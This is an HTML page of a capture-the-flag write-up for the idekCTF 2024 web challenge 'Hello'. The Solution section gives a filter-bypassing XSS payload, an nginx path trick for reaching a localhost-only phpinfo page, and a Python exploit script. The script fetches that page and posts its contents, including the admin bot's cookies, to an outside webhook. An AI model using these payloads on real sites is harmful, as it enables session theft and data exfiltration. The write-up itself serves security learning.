               

<!DOCTYPE html>
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Hello - ByteTheCookies</title>

    

    

    
    <meta name="author" content="ByteTheCookies" />
    

    
        <meta property="og:url" content="http://localhost:1313/writeups/idekctf2024/hello/">
  <meta property="og:site_name" content="ByteTheCookies">
  <meta property="og:title" content="Hello">
  <meta property="og:description" content="Hello Description: Just to warm you up for the next Fight :‚ÄúD
Introduction Then we have an apparently empty page, but where we can via a ?name= parameter enter some text, the page will then respond with hello, {text entered}
The with an ngix server">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-08-18T12:58:59+02:00">
    <meta property="article:modified_time" content="2024-08-19T09:28:03+02:00">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Php">
    <meta property="article:tag" content="XSS">
    <meta property="article:tag" content="133 Points">
    <meta property="article:tag" content="165 Solves">
    <meta property="article:tag" content="Abdelhameed Ghazy">

    

    
        
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Hello">
  <meta name="twitter:description" content="Hello Description: Just to warm you up for the next Fight :‚ÄúD
Introduction Then we have an apparently empty page, but where we can via a ?name= parameter enter some text, the page will then respond with hello, {text entered}
The with an ngix server">

    <link rel="stylesheet" href="/style.css" integrity="">



    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">



    
        <script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
></script>
<script>
  MathJax = {
    tex: {
      displayMath: [
        ["\\[", "\\]"],
        ["$$", "$$"],
      ], 
      inlineMath: [["\\(", "\\)"]], 
    },
  };
</script>

    

    
    <script>
        if (!('theme' in localStorage)) {
            localStorage.theme = 'dark';
        }

        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.setAttribute("data-theme", "dark");
        } else {
            document.documentElement.setAttribute("data-theme", "light");
        }
    </script>
<script defer src="/js/header.js" integrity=""></script>



    <script defer src="/js/zooming.js" integrity=""></script>







    
        

        
        

        
        
            
        

        <script defer src="/js/prism.js" integrity="" data-manual></script>
    



    
    
    
    <script defer src="/js/search-en.js" integrity=""></script>




<link rel="stylesheet" href="http://localhost:1313/user.css">

    
</head>
<body><header>
    <div id="header_left">
        <div id="sidebar_btn">
            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
            <label id="sidebar_btn_label" for="sidebar_btn_input">
                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
</svg>

</svg>
            </label>
            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
                <div id="sidebar_canvas_overlay"></div>
            </label>
            <div id="sidebar">
                <ul><li>
                            <a href="/">üíª About</a></li><li>
                            <a href="/news/">üì∞ News</a></li><li>
                            <a href="/writeups/">üìë Writeups</a></li><li>
                            <a href="/contacts/">‚úâÔ∏è Contacts</a></li></ul>
            </div>
        </div>
    
        <div class="brand">
            <div>
                <a href="/">ByteTheCookies</a>
            </div>
        </div>
    </div>

    <div class="toolbox">
        <div id="theme_tool">
            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
</svg>

</svg>
            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
</svg>

</svg>
        </div>

        
            <div id="search_tool">
                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>

</svg><div id="search_menu_wrapper" class="hidden">
    <div id="search_menu">
        <div id="search_menu_toolbar">
            <div id="search_menu_input_wrapper">
                <input id="search_menu_input" type="text" placeholder='Search Posts'>
            </div>
            <div id="search_menu_close_btn">
                <svg width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
</svg>

</svg>
            </div>
        </div>
        <div id="search_menu_results">
        </div>
    </div>
</div>
</div>
        

        
    </div>
</header>
<nav id="navbar" class="pure-menu">
    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
                    
                        <a href="/" class="pure-menu-link">üíª About</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/news/" class="pure-menu-link">üì∞ News</a>
                    
                </li><li class="navbar-item pure-menu-item insection">
                    
                        <a href="/writeups/" class="pure-menu-link">üìë Writeups</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/contacts/" class="pure-menu-link">‚úâÔ∏è Contacts</a>
                    
                </li></ul>
</nav>
<main>
      <div id="content" class="content-margin">
        
    
    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#source">Source</a></li>
    <li><a href="#solution">Solution</a></li>
  </ul>
</nav>
        
    </div></details>



<div class="tags">
  
    <div class="badge">Web</div>

  
    <div class="badge">php</div>

  
    <div class="badge">XSS</div>

  
    <div class="badge">133 points</div>

  
    <div class="badge">165 solves</div>

  
    <div class="badge">Abdelhameed Ghazy</div>

  
</div>

<div>
  <p class="date">
    Last edit: Aug 18, 2024
  </p>
</div>


    <div class="content-margin">



<article >
    
    
        
        
    
    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Hello</h1>
<p><strong>Description</strong>: Just to warm you up for the next Fight :&ldquo;D</p>

<h2 id="introduction" class="header-anchor-wrapper">Introduction
  <a href="#introduction" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p>Then we have an apparently empty page, but where we can via a ?name= parameter enter some text, the page will then respond with hello, {text entered}</p>
<p>The with an ngix server</p>
<p>Moreover, ctf in general gives us the possibility of using an admin bot where the flag is set in the cookies</p>

<h2 id="source" class="header-anchor-wrapper">Source
  <a href="#source" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<pre  class="mc-prism hide language-text" ><code class="language-php"># filename: index.py

&lt;?php


function Enhanced_Trim($inp) {
    $trimmed = array(&quot;\r&quot;, &quot;\n&quot;, &quot;\t&quot;, &quot;/&quot;, &quot; &quot;);
    return str_replace($trimmed, &quot;&quot;, $inp);
}


if(isset($_GET['name']))
{
    $name=substr($_GET['name'],0,23);
    echo &quot;Hello, &quot;.Enhanced_Trim($_GET['name']);
}

?&gt;

</code></pre>
<pre  class="mc-prism hide language-text" ><code class="language-php"># filename: info.py

&lt;?php
phpinfo();
?&gt;

</code></pre>
<pre  class="mc-prism hide language-text" ><code class="language-ngix"># filename: ngix.conf


user www-data;
worker_processes 1;

events {
worker_connections 1024;
}

http {
include /etc/nginx/mime.types;
default_type application/octet-stream;

    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;

        location / {
            root   /usr/share/nginx/html;
            index  index.php index.html index.htm;
        }

        location = /info.php {
        allow 127.0.0.1;
        deny all;
        }

        location ~ \.php$ {
        root           /usr/share/nginx/html;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        include fastcgi_params;
        fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
        }

    }

}
</code></pre>
<p>As you can see, there are 3 main files to focus on</p>
<ol>
<li>The first is the index file where we see how the page works and the filters used, in particular the fact that we cannot use /, spaces, etc.</li>
<li>An info.php file which is definitely suspect and not normally needed but probably has a purpose in the challange</li>
<li>And the ngix configuration file, which is very important because it is the one that prevents us from accessing info.php in a simple way.</li>
</ol>

<h2 id="solution" class="header-anchor-wrapper">Solution
  <a href="#solution" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p>This challenge is very nice in my opinion, neither too difficult nor too complex, it mixes different vulnerabilities in a really nice way&hellip;</p>
<p>The first one is designed to catch the cookie, because in the configuration of bot.js we see that the cookie is set to httpOnly, which makes the extraction much more difficult, but looking a little online we understand why it is present, that info.php in fact the function phpinfo() as well as showing several parameters of the php configuration and other information also shows the cookies present at that time&hellip; SO THAT&rsquo;S THE OBJECTIVE, to get your own bot to open /info.php.</p>
<p>But how can we do this?</p>
<p>The first step is to be able to inject a payload that opens info.php and sends the file somewhere.</p>
<p>The only entry point we see is <code>? name='</code>, which is not sanitised in the best way, in fact by doing <code>&lt;h1&gt;BTC</code> (we make sure that the tag closes itself, otherwise the final / will be filtered out) we notice that the h1 is rendered and this is a first sign that we can do an xss, although we notice that the classic <code>&lt;script&gt;alert('ByteTheCookies')</code> doesn&rsquo;t work, Probably some php configuration or some police, so the xss would be a bit more complex, but we can use the <code>onerror</code> parameter of tag img with some modifications, in fact, if we insert a classic <code>&lt;img src='invalid. jpg' onerror=&quot;alert('ByteTheCookies')&quot;</code>, it will be sanitised by removing the spaces and will not allow the xss to run. But we can work around this very easily, in fact by looking for some workarounds on HackTricks and trying some of them, we find that the payload <code>&lt;img%0Csrc=&quot;invalid.jpg&quot;onerror=&quot;alert('ByteTheCookies')&quot;</code> works.</p>
<p>GOOD we managed to bypass the xss now we have to create the payload we need&hellip;</p>
<p>Specifically, I used: <code>fetch('{target}').then(r=&gt;r.text()).then(t=&gt;{fetch('{url_webhook}',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Data sended');});</code></p>
<p>This payload makes an initial request and sends the content to a webhook in the form of a file, so it&rsquo;s all very simple.</p>
<p>However, the problem is that when this payload is sent, it will not work because the URLs contain / which will be removed and this is a significant problem.</p>
<p>However, to get around this we can use a very simple trick, we just need to encode the payload in base64 beforehand and use an <code>eval(atob(payload))</code>.</p>
<p>By sending this in the URL, we can make the payload work without any problems. DONE, RIGHT?</p>
<p>No, because analysing the nginx configuration we notice an important detail</p>
<pre  class="mc-prism hide language-text" ><code class="language-ngix">location = /info.php {
        allow 127.0.0.1;
        deny all;
        }
</code></pre>
<p>As we can see, /info.php is only accessible from localhost, and spoiler, our bot is not on the same server as the challenge.</p>
<p>This may seem like a big obstacle, but in reality, if we search the web for ngix workarounds, we can find something very <a href="https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm">interesting</a>.</p>
<p>As we can see on Hacktricks, if we insert an accessible page immediately after a non-accessible page in the ngix URL, it will redirect us correctly to the non-accessible page, which is exactly what we need.</p>
<p>So the final solution becomes:</p>
<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py

import base64

url = &quot;http://idek-hello.chal.idek.team:1337/&quot;
url_webhook = 'https://webhook.site/8b10c871-1e0b-4050-8
2e3-e102a73da54e'
url_admin = 'https://admin-bot.idek.team/idek-hello'

def main():

    # Bypass hacktrics https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm
    target = &quot;http://idek-hello.chal.idek.team:1337/info.php/index.php&quot;

    exploit = (&quot;fetch('&quot; + target + &quot;').then(r=&gt;r.text()).then(t=&gt;{fetch('&quot;+url_webhook+&quot;',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Dati inviati al webhook');});&quot;).encode()

    main_payload = base64.b64encode(exploit).decode()

    payload = &quot;&quot;&quot;&lt;img%0Csrc=&quot;invalid.jpg&quot;onerror=&quot;eval(atob('&quot;&quot;&quot; + main_payload + &quot;&quot;&quot;'));&quot;&gt;&quot;&quot;&quot; # Bypassed with %0C

    final_url_whith_exploit = f&quot;{url}?name={payload}&quot;

    print(f&quot;Final url: {final_url_whith_exploit}&quot;) # Send the url on the admin bot and download the file on webhook.site

    print(f&quot;Now copy and paste the url on the admin bot: {url_admin} and send the requeste to the admin bot, after this go to the webhook.site and download the file and search the flag in the file&quot;)

if __name__ == '__main__':
  main()

</code></pre>
<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag: idek{Ghazy_N3gm_Elbalad}
</code></pre>
<p align='right'>Author: akiidjk </p>

</article>
</div>
   
      </div>
    </main>
<footer>
    <article>Copyright ¬© 2024 by ByteTheCookies Team | v1.0</article>
</footer>

</body>
</html>
